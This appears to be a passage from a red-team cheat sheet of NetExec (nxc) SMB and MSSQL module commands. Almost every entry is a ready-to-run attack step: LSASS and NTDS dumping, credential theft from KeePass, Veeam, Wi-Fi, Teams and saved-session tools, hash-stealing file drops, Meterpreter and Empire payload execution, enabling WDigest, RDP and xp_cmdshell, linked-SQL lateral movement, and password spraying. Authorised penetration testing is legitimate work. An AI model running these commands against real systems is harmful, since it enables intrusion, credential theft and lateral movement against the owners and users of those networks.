```sh title:"Check NTLM reflection CVE-2025-33073"
nxc smb $domain -u $user $auth_flags -M ntlm_reflection
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### printnightmare

Check vulnerability to PrintNightmare (CVE-2021-1675/34527).

```sh title:"Check PrintNightmare (CVE-2021-1675 / 34527)"
nxc smb $domain -u $user $auth_flags -M printnightmare
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### remove-mic

Check vulnerability to CVE-2019-1040 (NTLM MIC removal). Pair with relay attacks.

```sh title:"Check CVE-2019-1040 NTLM MIC removal, relay prereq"
nxc smb $domain -u $user $auth_flags -M remove-mic
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### sccm-recon6

Check via winreg whether the target is an SCCM Distribution Point or Primary Site Server (RECON-6).

```sh title:"Check if target is SCCM DP / Primary Site (RECON-6)"
nxc smb $domain -u $user $auth_flags -M sccm-recon6
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### smbghost

Check SMB 3.1.1 dialect + compression flag (SMBGhost CVE-2020-0796).

```sh title:"Check SMBGhost CVE-2020-0796 dialect + compression"
nxc smb $domain -u $user $auth_flags -M smbghost
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### spooler

Detect whether the print spooler service is enabled. Prereq for the printer-bug coercion.

```sh title:"Detect print spooler enabled, PrinterBug prereq"
nxc smb $domain -u $user $auth_flags -M spooler
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### webdav

Check whether the WebClient service is running on the target. Required for HTTP-based coercion (auth via UNC).

```sh title:"Check WebClient running, HTTP coercion prereq"
nxc smb $domain -u $user $auth_flags -M webdav
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### zerologon

Check whether the DC is vulnerable to Zerologon (CVE-2020-1472).

```sh title:"Check Zerologon CVE-2020-1472 on DC"
nxc smb $domain -u $user $auth_flags -M zerologon
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### aws-credentials

Search the target filesystem for AWS credential files. Also available on winrm and ssh protocols.

```sh title:"Hunt AWS credential files (also winrm / ssh)"
nxc smb $domain -u $user $auth_flags -M aws-credentials
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### change-password

Change or reset a user's password via SMB.

```sh title:"Change / reset user password via SMB"
nxc smb $domain -u $user $auth_flags -M change-password -o USER=$target_user NEWPASS=$target_pass
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var target_user
var target_pass
-->

### drop-library-ms

Plant a `.library-ms` file on writable shares to coerce NTLMv2 hashes via CVE-2025-24054 (zero-click).

```sh title:".library-ms zero-click NTLMv2 theft (CVE-2025-24054)"
nxc smb $domain -u $user $auth_flags -M drop-library-ms -o SERVER=$lhost
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var lhost
-->

### scuffy

Drop a `.scf` file with a UNC icon path on every writable share. Triggers NTLM auth when the folder is browsed.

```sh title:".scf icon UNC trick on writable shares for NTLM theft"
nxc smb $domain -u $user $auth_flags -M scuffy -o SERVER=$lhost
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var lhost
-->

### bitlocker (HIGH)

Read BitLocker status on targets (enabled/disabled).

```sh title:"Read BitLocker status on target hosts"
nxc smb $domain -u $user $auth_flags -M bitlocker
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### enum_dns (HIGH)

Use WMI to dump DNS records from an AD-integrated DNS server.

```sh title:"WMI dump of DNS records from AD DNS server"
nxc smb $domain -u $user $auth_flags -M enum_dns
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### enum_interfaces (HIGH)

Read network interface info (name, IP, mask, gateway) from the remote registry.

```sh title:"Network interface info from remote registry"
nxc smb $domain -u $user $auth_flags -M enum_interfaces
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### hyperv-host (HIGH)

Look up which Hyper-V host owns the target VM via registry.

```sh title:"Look up Hyper-V host of VM via registry"
nxc smb $domain -u $user $auth_flags -M hyperv-host
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### install_elevated (HIGH)

Check the AlwaysInstallElevated registry settings (low-priv MSI install as SYSTEM).

```sh title:"Check AlwaysInstallElevated for MSI privesc"
nxc smb $domain -u $user $auth_flags -M install_elevated
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### keepass_discover (HIGH)

Search for KeePass database files and running KeePass processes on the target.

```sh title:"Search target for KeePass DBs and processes"
nxc smb $domain -u $user $auth_flags -M keepass_discover
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### lockscreendoors (HIGH)

Detect lock-screen backdoors by checking the FileDescription of accessibility binaries (sethc, utilman, etc.).

```sh title:"Detect sethc/utilman lock-screen backdoors"
nxc smb $domain -u $user $auth_flags -M lockscreendoors
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### ntlmv1 (HIGH)

Detect if `lmcompatibilitylevel` is below 3, meaning NTLMv1 is permitted.

```sh title:"Detect NTLMv1 permitted (lmcompatibilitylevel < 3)"
nxc smb $domain -u $user $auth_flags -M ntlmv1
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### presence (HIGH)

Trace Domain and Enterprise Admin presence on the target over SMB. Maps where high-priv accounts have logged on.

```sh title:"Trace DA / EA presence on target over SMB"
nxc smb $domain -u $user $auth_flags -M presence
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### reg-query (HIGH)

Run an arbitrary registry query on the target.

```sh title:"Arbitrary registry query on target"
nxc smb $domain -u $user $auth_flags -M reg-query -o KEY=$reg_key
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var reg_key
-->

### runasppl (HIGH)

Check whether the LSA RunAsPPL bit is set. If unset, LSASS can be touched by ordinary admin tooling.

```sh title:"Check LSA RunAsPPL (unset = LSASS dumpable)"
nxc smb $domain -u $user $auth_flags -M runasppl
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### test_connection (HIGH)

Ping a host through nxc to sanity-check reachability before running heavier modules.

```sh title:"Ping host via nxc, sanity check before heavy modules"
nxc smb $domain -u $user $auth_flags -M test_connection
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### uac (HIGH)

Read UAC configuration on the target.

```sh title:"Read UAC configuration on target"
nxc smb $domain -u $user $auth_flags -M uac
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### wcc (HIGH)

Run the Windows security configuration check (broad hardening audit).

```sh title:"Broad Windows hardening / security config audit"
nxc smb $domain -u $user $auth_flags -M wcc
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### dpapi_hash (HIGH)

Remotely dump DPAPI hashes derived from masterkeys.

```sh title:"Remotely dump DPAPI hashes from masterkeys"
nxc smb $domain -u $user $auth_flags -M dpapi_hash
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### eventlog_creds (HIGH)

Extract credentials from Windows event logs (4688 process-creation and SYSMON command lines).

```sh title:"Pull creds from event log 4688 / SYSMON cmdlines"
nxc smb $domain -u $user $auth_flags -M eventlog_creds
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### handlekatz (HIGH)

LSASS dump using handlekatz64, parsed remotely with pypykatz.

```sh title:"LSASS dump via handlekatz64 + pypykatz parse"
nxc smb $domain -u $user $auth_flags -M handlekatz
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### iis (HIGH)

Read IIS Application Pool configs via appcmd.exe to extract app-pool identity credentials.

```sh title:"IIS App Pool identity creds via appcmd.exe"
nxc smb $domain -u $user $auth_flags -M iis
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### keepass_trigger (HIGH)

Plant a malicious KeePass trigger that exports the database in cleartext on next unlock.

```sh title:"Plant KeePass trigger, exports DB cleartext on unlock"
nxc smb $domain -u $user $auth_flags -M keepass_trigger
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### lsassy (HIGH)

Dump LSASS and parse the result remotely using lsassy.

```sh title:"Remote LSASS dump + parse via lsassy"
nxc smb $domain -u $user $auth_flags -M lsassy
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### masky (HIGH)

Dump domain user credentials via ADCS + KDC (PKINIT chain to NT hash).

```sh title:"Dump domain creds via ADCS + KDC (masky PKINIT chain)"
nxc smb $domain -u $user $auth_flags -M masky
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### mobaxterm (HIGH)

Dump MobaXterm credentials via remote registry or NTUSER.dat export.

```sh title:"MobaXterm creds via remote registry / NTUSER.dat"
nxc smb $domain -u $user $auth_flags -M mobaxterm
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### mremoteng (HIGH)

Dump mRemoteNG passwords from AppData and recursively from Desktop / Documents.

```sh title:"mRemoteNG passwords from AppData / Desktop / Docs"
nxc smb $domain -u $user $auth_flags -M mremoteng
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### msol (HIGH)

Dump the MSOL cleartext password and Entra ID credentials from the local DB on the Entra ID Connect server.

```sh title:"MSOL cleartext + Entra ID creds from AAD Connect"
nxc smb $domain -u $user $auth_flags -M msol
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### nanodump (HIGH)

LSASS dump using nanodump, parsed remotely with pypykatz. Also available on the mssql protocol.

```sh title:"LSASS via nanodump + pypykatz parse (also mssql)"
nxc smb $domain -u $user $auth_flags -M nanodump
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### notepad (HIGH)

Extract content from the Windows Notepad tab-state binary files (unsaved drafts).

```sh title:"Notepad unsaved drafts from tab-state binary"
nxc smb $domain -u $user $auth_flags -M notepad
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### notepad++ (HIGH)

Extract Notepad++ unsaved files.

```sh title:"Notepad++ unsaved files"
nxc smb $domain -u $user $auth_flags -M notepad++
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### ntds-dump-raw (HIGH)

Extract NTDS.dit, SAM, and SYSTEM by reading the raw disk. Bypasses VSS-based detections. Also runs over winrm and wmi.

```sh title:"NTDS via raw-disk read (bypasses VSS, also winrm/wmi)"
nxc smb $domain -u $user $auth_flags -M ntds-dump-raw
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### ntdsutil (HIGH)

Dump NTDS using `ntdsutil.exe` snapshot path.

```sh title:"NTDS dump via ntdsutil.exe snapshot path"
nxc smb $domain -u $user $auth_flags -M ntdsutil
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### powershell_history (HIGH)

Pull every user's PSReadline history and grep for sensitive command patterns.

```sh title:"PSReadline history per user, grep for sensitive cmds"
nxc smb $domain -u $user $auth_flags -M powershell_history
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### procdump (HIGH)

LSASS dump using procdump64, parsed remotely with pypykatz.

```sh title:"LSASS via procdump64 + pypykatz parse"
nxc smb $domain -u $user $auth_flags -M procdump
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### putty (HIGH)

Find PuTTY-saved SSH private keys in the registry and download them.

```sh title:"Find + download PuTTY-saved SSH private keys"
nxc smb $domain -u $user $auth_flags -M putty
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### rdcman (HIGH)

Remotely dump RDCMan (Remote Desktop Connection Manager) saved credentials.

```sh title:"Remote dump RDCMan saved credentials"
nxc smb $domain -u $user $auth_flags -M rdcman
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### recent_files (HIGH)

Extract recently modified files from the target. Useful for finding active project / handover docs.

```sh title:"Extract recently modified files from target"
nxc smb $domain -u $user $auth_flags -M recent_files
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### recyclebin (HIGH)

List and export the contents of users' recycle bins.

```sh title:"List and export users' recycle bin contents"
nxc smb $domain -u $user $auth_flags -M recyclebin
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### reg-winlogon (HIGH)

Collect autologon credentials stored under the Winlogon registry key.

```sh title:"Autologon creds from Winlogon registry key"
nxc smb $domain -u $user $auth_flags -M reg-winlogon
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### security-questions (HIGH)

Pull users' local-account security questions and answers.

```sh title:"Local-account security questions and answers"
nxc smb $domain -u $user $auth_flags -M security-questions
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### snipped (HIGH)

Download screenshots taken by the new Snipping Tool.

```sh title:"Download Snipping Tool screenshots from target"
nxc smb $domain -u $user $auth_flags -M snipped
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### teams_localdb (HIGH)

Pull the cleartext `ssoauthcookie` from the local Teams database. Kills running Teams processes if needed.

```sh title:"Cleartext ssoauthcookie from local Teams DB"
nxc smb $domain -u $user $auth_flags -M teams_localdb
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### veeam (HIGH)

Extract credentials from a local Veeam SQL database. Veeam typically holds backup-target creds across the estate.

```sh title:"Veeam SQL DB creds (often estate-wide backup creds)"
nxc smb $domain -u $user $auth_flags -M veeam
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### vnc (HIGH)

Loot passwords from VNC server and client configuration files.

```sh title:"Loot VNC server / client config passwords"
nxc smb $domain -u $user $auth_flags -M vnc
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### wam (HIGH)

Dump access tokens from the Token Broker Cache (Web Account Manager).

```sh title:"Dump tokens from Token Broker (WAM) cache"
nxc smb $domain -u $user $auth_flags -M wam
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### wdigest (HIGH)

Toggle the `UseLogonCredential` registry key to re-enable WDigest cleartext credential caching on Win 8.1+.

```sh title:"Re-enable WDigest cleartext caching via registry"
nxc smb $domain -u $user $auth_flags -M wdigest -o ACTION=enable
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### wifi (HIGH)

Pull the keys for every wireless interface on the host.

```sh title:"Pull keys for every wireless interface on host"
nxc smb $domain -u $user $auth_flags -M wifi
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### winscp (HIGH)

Find WinSCP.ini files in registry and default locations, then extract saved credentials.

```sh title:"WinSCP saved creds from .ini and registry"
nxc smb $domain -u $user $auth_flags -M winscp
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### empire_exec (HIGH)

Generate an Empire launcher via the RESTful API and execute it on the target.

```sh title:"Generate + execute Empire launcher via RESTful API"
nxc smb $domain -u $user $auth_flags -M empire_exec
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### hash_spider (HIGH)

Dump LSASS recursively starting from a single hash, using BloodHound to chase local admin paths.

```sh title:"Recursive LSASS dump from one hash via BloodHound paths"
nxc smb $domain -u $user $auth_flags -M hash_spider
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### impersonate (HIGH)

List and impersonate tokens to run commands as locally logged-on users.

```sh title:"List + impersonate tokens of logged-on users"
nxc smb $domain -u $user $auth_flags -M impersonate
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### met_inject (HIGH)

Download the Meterpreter stager and inject it into memory.

```sh title:"Download + inject Meterpreter stager in memory"
nxc smb $domain -u $user $auth_flags -M met_inject
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### pi (HIGH)

Run a command as a logged-on user via process injection.

```sh title:"Run cmd as logged-on user via process injection"
nxc smb $domain -u $user $auth_flags -M pi -o COMMAND=$cmd
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var cmd
-->

### rdp (HIGH)

Enable or disable RDP on the target via registry. Use to open the door for follow-on lateral movement.

```sh title:"Enable / disable RDP via registry"
nxc smb $domain -u $user $auth_flags -M rdp -o ACTION=enable
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### remote-uac (HIGH)

Enable or disable remote UAC. Disabling it lets non-domain admin local accounts perform admin actions over the network.

```sh title:"Toggle remote UAC for local-admin lateral movement"
nxc smb $domain -u $user $auth_flags -M remote-uac -o ACTION=disable
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### schtask_as (HIGH)

Remotely create a scheduled task running as a chosen logged-on user.

```sh title:"Schedule task running as chosen logged-on user"
nxc smb $domain -u $user $auth_flags -M schtask_as -o USER=$target_user CMD=$cmd
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var target_user
var cmd
-->

### shadowrdp (HIGH)

Enable or disable Shadow RDP (silent session takeover via RDS shadowing).

```sh title:"Toggle Shadow RDP for silent session takeover"
nxc smb $domain -u $user $auth_flags -M shadowrdp -o ACTION=enable
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### web_delivery (HIGH)

Kick off a Metasploit web_delivery payload on the target.

```sh title:"Kick off Metasploit web_delivery payload"
nxc smb $domain -u $user $auth_flags -M web_delivery
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

## nxc mssql modules

### enum_impersonate

List MSSQL users with impersonation privileges. Often a fast route from low-priv login to sysadmin.

```sh title:"List MSSQL users with IMPERSONATE privileges"
nxc mssql $domain -u $user $auth_flags -M enum_impersonate
```
<!-- cheat
import domain_ip
var user
var auth_flags
-->

### enum_links

Enumerate linked SQL servers and their login configs. Linked-server hops chain across DB hosts.

```sh title:"Linked SQL servers + login configs (chain hops)"
nxc mssql $domain -u $user $auth_flags -M enum_links
```
<!-- cheat
import domain_ip
var user
var auth_flags
-->

### mssql_cbt

Check whether Channel Binding (EPA) is enforced on the MSSQL instance. Disabled CBT enables NTLM relay to MSSQL.

```sh title:"Check Channel Binding (EPA) for MSSQL relay path"
nxc mssql $domain -u $user $auth_flags -M mssql_cbt
```
<!-- cheat
import domain_ip
var user
var auth_flags
-->

### mssql_dumper

Search every database for sensitive data patterns.

```sh title:"Search every DB for sensitive data patterns"
nxc mssql $domain -u $user $auth_flags -M mssql_dumper
```
<!-- cheat
import domain_ip
var user
var auth_flags
-->

### enable_cmdshell

Enable (or disable) `xp_cmdshell` on the SQL server. Required before using OS shell primitives.

```sh title:"Enable / disable xp_cmdshell on SQL server"
nxc mssql $domain -u $user $auth_flags -M enable_cmdshell -o ACTION=enable
```
<!-- cheat
import domain_ip
var user
var auth_flags
-->

### exec_on_link

Execute a command on a linked SQL server. Lateral SQL execution across the link graph.

```sh title:"Execute command on linked SQL server (lateral SQL)"
nxc mssql $domain -u $user $auth_flags -M exec_on_link -o LINK=$link CMD=$cmd
```
<!-- cheat
import domain_ip
var user
var auth_flags
var link
var cmd
-->

### link_enable_cmdshell

Enable / disable `xp_cmdshell` on a linked MSSQL server.

```sh title:"Toggle xp_cmdshell on a linked MSSQL server"
nxc mssql $domain -u $user $auth_flags -M link_enable_cmdshell -o LINK=$link ACTION=enable
```
<!-- cheat
import domain_ip
var user
var auth_flags
var link
-->

### link_xpcmd

Run `xp_cmdshell` commands on a linked SQL server.

```sh title:"Run xp_cmdshell on a linked SQL server"
nxc mssql $domain -u $user $auth_flags -M link_xpcmd -o LINK=$link CMD=$cmd
```
<!-- cheat
import domain_ip
var user
var auth_flags
var link
var cmd
-->

### mssql_priv

Enumerate and exploit MSSQL-side privileges (impersonate, EXECUTE AS, db_owner abuse).

```sh title:"Enumerate + exploit MSSQL privileges"
nxc mssql $domain -u $user $auth_flags -M mssql_priv
```
<!-- cheat
import domain_ip
var user
var auth_flags
-->

## nxc auth checks

### Null session

Probe a host with empty creds - some older / misconfigured boxes still allow anonymous SMB enumeration.

```sh title:"Probe SMB with empty creds (null session test)"
nxc smb $rhost_ip -u '' -p ''
```
<!-- cheat
import domain_ip
-->

### Anonymous login

Same as null session but with a dummy username - some hosts require a non-empty user but accept any creds.

```sh title:"Probe SMB with bogus username + empty password (anonymous)"
nxc smb $rhost_ip -u 'a' -p ''
```
<!-- cheat
import domain_ip
-->

### Active SMB sessions

List sessions currently established to the target's IPC$. Pre-2016 hosts allow this anonymously; modern hosts need creds.

```sh title:"List established SMB sessions on target"
nxc smb $domain -u $user $auth_flags --sessions
```
<!-- cheat
import domain_ip
var user
var auth_flags
-->

## nxc password spray

### Spray (one user per password)

Spray each user-line against the matching password-line (no full cartesian product). Use after generating a wordlist where line N is the password for user N.

```sh title:"Spray user-N vs password-N (no cartesian product)"
nxc smb $rhost_ip -u $users_file -p $passwords_file --no-bruteforce --continue-on-success
```
<!-- cheat
import domain_ip
var users_file
var passwords_file
-->

### Spray (all users vs single password)

Try every user against one common password - safest spray pattern for avoiding lockouts.

```sh title:"Try every user with one password (cleanest spray)"
nxc smb $rhost_ip -u $users_file -p $single_password --continue-on-success
```
<!-- cheat
import domain_ip
var users_file
var single_password
-->